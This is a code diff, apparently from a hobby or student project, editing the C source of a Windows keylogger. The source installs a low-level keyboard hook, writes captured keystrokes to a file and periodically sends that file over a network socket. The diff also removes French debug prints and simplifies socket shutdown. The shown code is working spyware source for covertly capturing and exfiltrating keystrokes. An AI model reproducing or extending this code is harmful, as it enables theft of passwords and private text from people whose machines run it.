@@ -100,17 +100,17 @@ const struct keyboard keyboard[] =
 	{ VK_OEM_MINUS, "[-]" },
 	{ VK_OEM_PLUS, "[+]" },
 	{ VK_OEM_1, "[;]" },
-	{ VK_OEM_3, "[`]"},
+	{ VK_OEM_3, "[`]" },
 	{ VK_OEM_4, "[ [ ]" },
 	{ VK_OEM_5, "[\\]" },
 	{ VK_OEM_6, "[ ] ]" },
 	{ VK_OEM_7, "[']" },
 	{ VK_OEM_COMMA, "," },
-	{ VK_OEM_PERIOD, "."},
+	{ VK_OEM_PERIOD, "." },
 	{ VK_APPS, "[APPS]" },
 	{ 0, "[UNKNOWN]" }
 };
-	
+
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 {
 	LPKBDLLHOOKSTRUCT kb;
@@ -151,7 +151,6 @@ void	setwinhook()
 	CloseHandle(process.hProcess);
 	CloseHandle(process.hThread);
 #endif // 0
-
 }
 
 void	save_data(const char *data)
@@ -179,11 +178,7 @@ void	save_data(const char *data)
 	if (countTime > 5)
 	{
 		countTime = 0;
-		printf("coucou je suis dans le count time\n");
-		//if (fclose(file) != 0)
-			//_wperror(L" Close file failed ");
 		send_data(my_sock, file);
-		printf("je suis apres le send data \n");
 		if (fclose(file) != 0)
 			_wperror(L"Close file failed");
 		if (_wfopen_s(&file, L"test.txt", L"w+") != 0)
@@ -195,26 +190,27 @@ void	save_data(const char *data)
 	nbChar++;
 }
 
+void no_die_client(void)
+{
+	printf("je suis bien dans le thread\n");
+	return;
+}
+
 int	main(void)
 {
 	MSG msg;
 	WSADATA wsadata;
-	
+
 	WSAStartup(MAKEWORD(2, 0), &wsadata);
 	my_sock = init_socket(my_sock);
-	setwinhook();				
+	if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)no_die_client, NULL, 0, NULL) == NULL)
+		return (-1);
+	setwinhook();
 	while (GetMessage(&msg, NULL, 0, 0))
 	{
 		if (PeekMessage(&msg, NULL, WM_CLOSE, WM_CLOSE, PM_NOREMOVE) == TRUE)
 		{
-			if (shutdown(my_sock, SD_BOTH) == SOCKET_ERROR)
-			{
-				printf("failed shutdown\n");
-				Sleep(2000);
-				closesocket(my_sock);
-				return;
-			}
-			closesocket(my_sock);
+			break;
 		}
 		TranslateMessage(&msg);
 		DispatchMessage(&msg);
@@ -223,11 +219,9 @@ int	main(void)
 	if (shutdown(my_sock, SD_BOTH) == SOCKET_ERROR)
 	{
 		printf("failed shutdown\n");
-		Sleep(2000);
 		closesocket(my_sock);
 		return;
 	}
-	Sleep(2000);
 	closesocket(my_sock);
 	WSACleanup();
 	return (msg.wParam);
